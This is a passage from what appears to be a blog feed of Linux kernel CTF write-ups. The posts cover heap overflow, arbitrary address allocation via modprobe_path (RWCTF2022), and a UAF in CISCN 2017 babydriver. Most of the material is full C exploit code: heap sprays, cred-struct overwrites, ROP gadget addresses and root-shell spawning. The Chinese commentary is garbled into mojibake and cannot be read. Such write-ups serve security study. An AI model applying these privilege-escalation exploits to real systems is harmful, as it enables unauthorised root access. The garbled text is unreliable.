class="hljs-type">size_t</span>)get_root_shell;<br>    save_status();<br>    user_sp += <span class="hljs-number">8</span>;<br>    bindCore(<span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    create(fd, <span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-type">size_t</span> fake_data[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode, shellcode&#125;;<br>    edit(fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, fake_data);<br>    <span class="hljs-type">int</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>    &#123;<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(seq_fd[i] &lt; <span class="hljs-number">0</span>)<br>            fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    &#125;<br>    save(fd, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], buf, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap Arbitrary-Address-Allocation</title>
    <link href="/2023/08/18/kernel-heap-aaa/"/>
    <url>/2023/08/18/kernel-heap-aaa/</url>
    
    <content type="html"><![CDATA[<p>å…ˆè·³è¿‡äº†æ¡ä»¶ç«äº‰ï¼Œå †å–·é‡åˆ°ä¸€ä¸ªå¤§é—®é¢˜å°±æ˜¯nokaslrçš„æ—¶å€™åˆ©ç”¨ä¸æˆåŠŸï¼ˆå¥½åƒæ˜¯åˆ†é…çš„æ—¶å€™å‡ºäº†é—®é¢˜ï¼‰ï¼Œä½†å¼€kaslrçš„æ—¶å€™è°ƒè¯•ä¸äº†â€¦â€¦æ‰€ä»¥ä¹Ÿå…ˆè·³è¿‡äº†ï¼Œè¿™ä¸ªçœ‹èµ·æ¥æ¯”è¾ƒç®€å•å°±å…ˆæè¿™ä¸ª(âŠ™ï¹âŠ™)</p><span id="more"></span><p>åˆ©ç”¨æ–¹å¼å°±æ˜¯é€šè¿‡UAFæ›´æ”¹objectçš„nextæŒ‡é’ˆå®ç°ä»»æ„åœ°å€åˆ†é…æ²¡å•¥å¥½è¯´çš„</p><p>ä¸Šä¾‹é¢˜ï¼</p><h1 id="ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ›-Digging-into-kernel"><a href="#ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ›-Digging-into-kernel" class="headerlink" title="ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ› - Digging into kernel"></a>ä¾‹é¢˜ï¼šRWCTF2022é«˜æ ¡èµ› - Digging into kernel</h1><p>ä¸»è¦åˆ†ä¸¤æ­¥ï¼šæ³„éœ²kernelåŸºå€å’Œææƒ</p><h2 id="æ³„éœ²kernelåŸºå€"><a href="#æ³„éœ²kernelåŸºå€" class="headerlink" title="æ³„éœ²kernelåŸºå€"></a>æ³„éœ²kernelåŸºå€</h2><p>åˆ†ä¸¤æ­¥</p><ul><li>é€šè¿‡objectçš„nextæŒ‡é’ˆæ³„éœ²ä¸€ä¸ªå †ä¸­çš„åœ°å€æ¥çŒœpage_offset_base</li><li>page_offset_base+0x9d000å¤„æ˜¯secondary_startup_64çš„åœ°å€ï¼Œå¯ä»¥ç”±æ­¤è®¡ç®—kernelåŸºå€</li></ul><p><strong>ä¸ºä»€ä¹ˆpage_offset_base+0x9d000æ˜¯secondary_startup_64çš„åœ°å€ï¼š</strong></p><p>0xffff888000000000-0xffffc87fffffffffæ˜¯ç‰©ç†åœ°å€çš„çº¿æ€§æ˜ å°„åŒºï¼Œæ‰€ä»¥page_offset_base+0x9d000åº”è¯¥æ˜¯ç‰©ç†åœ°å€0x9d000ï¼Œå±äºä¿æŠ¤æ¨¡å¼ä½¿ç”¨çš„å†…å­˜åŒºåŸŸï¼Œä½†è¿™ä¸ªåœ°å€åœ¨è¿›å…¥é•¿æ¨¡å¼æ—¶çš„å†…å®¹è¿˜æ˜¯0ï¼Œæ‰€ä»¥è¿™æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä¹Ÿä¸çŸ¥é“ï¼ˆ</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>è¦†å†™modprobe_pathä»¥rootæ‰§è¡Œç¨‹åºï¼š</p><p>å½“æ‰§è¡Œï¼ˆexecveï¼‰ä¸€ä¸ªéæ³•çš„æ–‡ä»¶ï¼ˆfile magic not foundï¼‰ï¼Œä¼šä»¥rootæƒé™æ‰§è¡Œä»¥modprobe_pathä¸ºè·¯å¾„çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé»˜è®¤å€¼ä¸º&#x2F;sbin&#x2F;modprobeï¼‰</p><p>å¯ä»¥å°†modprobe_pathæ›´æ”¹ä¸ºæ¶æ„è„šæœ¬çš„è·¯å¾„ï¼ˆexpä¸­é—´æ˜¯æ”¹å˜flagçš„æƒé™ï¼‰</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0x1444700</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *content;<br>    <span class="hljs-type">int</span> index;<br>    <span class="hljs-type">int</span> size;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x7777777</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x1111111</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_buf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> data *data_ptr)</span><br>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6666666</span>, data_ptr);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    bindCore(<span class="hljs-number">0</span>);<br><br>    system(<span class="hljs-string">&quot;echo \&quot;#!/bin/sh\nchmod 777 /flag\&quot; &gt; /home/getshell&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/getshell&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">3</span>], i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        fd[i] = open(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(fd[i] &lt; <span class="hljs-number">0</span>)<br>            fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> <span class="hljs-title">mydata</span>;</span><br>    mydata.content = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    mydata.index = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-built_in">memset</span>(mydata.content, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br><br>    alloc_buf(fd[<span class="hljs-number">0</span>], &amp;mydata);<br>    close(fd[<span class="hljs-number">0</span>]);<br><br>    read_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    <span class="hljs-type">size_t</span> heap_base = mydata.content[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get the heap base : 0x%lx\033[0m\n&quot;</span>, heap_base);<br><br>    mydata.content[<span class="hljs-number">0</span>] = (<span class="hljs-type">size_t</span>)(heap_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>);<br>    mydata.index = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">8</span>;<br><br>    write_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br><br>    mydata.size = <span class="hljs-number">0x18</span>;<br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    read_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br><br>    <span class="hljs-type">size_t</span> kernel_base = mydata.content[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    <span class="hljs-keyword">if</span>((kernel_base &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Leak Kernel Base Error!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get kernel base : 0x%lx\033[0m\n&quot;</span>, kernel_base);<br><br>    alloc_buf(fd[<span class="hljs-number">1</span>], &amp;mydata);<br>    close(fd[<span class="hljs-number">1</span>]);<br><br>    mydata.size = <span class="hljs-number">8</span>;<br>    mydata.content[<span class="hljs-number">0</span>] = MODPROBE_PATH - <span class="hljs-number">0x10</span> + kernel_base;<br>    write_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br><br>    alloc_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br>    alloc_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br>    mydata.content[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    mydata.content[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    mydata.size = <span class="hljs-number">0x20</span>;<br>    <span class="hljs-built_in">strcpy</span>(&amp;mydata.content[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;/home/getshell\0&quot;</span>);<br>    write_buf(fd[<span class="hljs-number">2</span>], &amp;mydata);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br><br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>);<br>    <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(flag_fd &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Fail Open flag!&quot;</span>);<br>    read(flag_fd, flag, <span class="hljs-keyword">sizeof</span>(flag));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] flag : %s\033[0m\n&quot;</span>, flag);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel Heap UAF</title>
    <link href="/2023/08/16/kernel-heap-uaf/"/>
    <url>/2023/08/16/kernel-heap-uaf/</url>
    
    <content type="html"><![CDATA[<p>æ‰‹è…•ç–¼æ­»äº†ï¼Œè¿™å‡ å¤©å•¥éƒ½æ²¡å¹²æˆâ€¦â€¦ä»Šå¤©ç»ˆäºå¥½ç‚¹äº†</p><p>æ‰“ç®—å…ˆåšé¢˜ï¼Œç­‰å¯¹å†…å­˜åˆ†é…æœºåˆ¶æœ‰ç‚¹å®æ„Ÿå†ç»†çœ‹æºç </p><span id="more"></span><p>ä»ä¾‹é¢˜è¯´èµ·</p><h1 id="ä¾‹é¢˜ï¼šCISCN-2017-babydriver"><a href="#ä¾‹é¢˜ï¼šCISCN-2017-babydriver" class="headerlink" title="ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver"></a>ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver</h1><p>è¿™é“é¢˜å¼€äº†-enable-kvmï¼Œæ‰“æ–­ç‚¹è¦ç”¨hbreakï¼ˆç¡¬ä»¶æ–­ç‚¹ï¼‰</p><h2 id="è¦†å†™credç»“æ„ä½“"><a href="#è¦†å†™credç»“æ„ä½“" class="headerlink" title="è¦†å†™credç»“æ„ä½“"></a>è¦†å†™credç»“æ„ä½“</h2><p>æ€è·¯å°±æ˜¯é‡Šæ”¾çš„0xa8çš„å †å—ä¼šè¢«é‡æ–°ç”³è¯·ç”¨ä½œcredç»“æ„ä½“ï¼Œè¿™æ ·å°±èƒ½åˆ©ç”¨UAFå°†credç»“æ„ä½“çš„uidã€guidæ”¹æˆ0</p><p>è¿™ç§æ–¹æ³•åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„kernelä¸­å·²ç»ä¸å¯è¡Œäº†ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬åœ¨åˆ›å»ºcred_jaræ—¶è®¾ç½®äº†SLAB_ACCOUNTæ ‡å¿—ï¼Œå½“CONFIG_MEMCG_KMEM&#x3D;yï¼ˆé»˜è®¤ï¼‰cred_jarä¸ä¼šå’Œç›¸åŒå¤§å°çš„kmalloc_192åˆå¹¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ—§ç‰ˆæœ¬cred_init</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred), <span class="hljs-number">0</span>,<br>SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ–°ç‰ˆæœ¬cred_init</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">cred_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* allocate a slab in which we can store credentials */</span><br>cred_jar = kmem_cache_create(<span class="hljs-string">&quot;cred_jar&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> cred),<br>     <span class="hljs-number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡cat &#x2F;proc&#x2F;slabinfoæŸ¥çœ‹kmem_cacheï¼Œæœ¬æœºæœ‰cred_jarè€Œqemuèµ·çš„é¢˜ç›®æ˜¯æ²¡æœ‰çš„</p><img src="/2023/08/16/kernel-heap-uaf/cred_jar.png" class title="cred_jar"><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd1 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <span class="hljs-type">int</span> fd2 = open_dev(<span class="hljs-string">&quot;/dev/babydev&quot;</span>);<br>    <span class="hljs-keyword">if</span>(fd2 &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Open Fail!&quot;</span>);<br>    <br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>        fail_print(<span class="hljs-string">&quot;Fork Fail!&quot;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> buf[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2, buf, <span class="hljs-number">28</span>);<br><br>        <span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>        &#123;<br>            success_print(<span class="hljs-string">&quot;Get Root Successfully!&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            fail_print(<span class="hljs-string">&quot;Get Root Fail!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p>è¿™ç§æ€è·¯ç±»ä¼¼äºFSOPï¼ˆéƒ½æ˜¯æ‰“ç»“æ„ä½“çš„è·³è½¬è¡¨ï¼‰</p><p>åŠ«æŒ&#x2F;dev&#x2F;ptmxä¼ªç»ˆç«¯çš„çš„tty_structç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br><span class="hljs-type">int</span>magic;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">int</span> index;<br>    <br>    â€¦â€¦        <br>&#125;<br></code></pre></td></tr></table></figure><p>tty_operationsè·³è½¬è¡¨é•¿è¿™æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br><span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br><span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br><br>    â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰å¼€å¯SMAPä¿æŠ¤ï¼Œå†…æ ¸æ€å¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®ROPé“¾å’Œfake tty_operarionsï¼Œè¿™é‡ŒåŠ«æŒwriteå‡½æ•°çš„æŒ‡é’ˆï¼Œä½¿ç”¨ä¸€ä¸ªgadgetå¯ä»¥ä½¿eaxå’Œespçš„é«˜4å­—èŠ‚ä¸º0å¹¶äº¤æ¢ä¸¤è€…çš„å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xffffffff8100008a</span> : xchg eax, esp ; ret<br></code></pre></td></tr></table></figure><p>è°ƒç”¨writeå‡½æ•°çš„æŒ‡ä»¤å¦‚ä¸‹ï¼Œæ­¤æ—¶raxæ˜¯fake_operationsçš„åœ°å€ï¼Œæ˜¯å¯æ§çš„ï¼Œä½¿é«˜4å­—èŠ‚ä¸º0æ—¶çš„åœ°å€è¿˜åœ¨ç”¨æˆ·ç©ºé—´ï¼Œå¯ä»¥åˆ©ç”¨mmapè·å¾—è¿™å—å†…å­˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:FFFFFFFF814DC0C3                 call    qword ptr [rax+<span class="hljs-number">38</span>h]<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å®Œæˆäº†æ ˆè¿ç§»ï¼Œåœ¨mmapçš„åŒºåŸŸå¸ƒç½®ææƒçš„ROPé“¾å°±è¡Œ</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_EAX_ESP_RET 0xffffffff8100008a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694          </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    <br>    commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br>    prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>; <br><br>    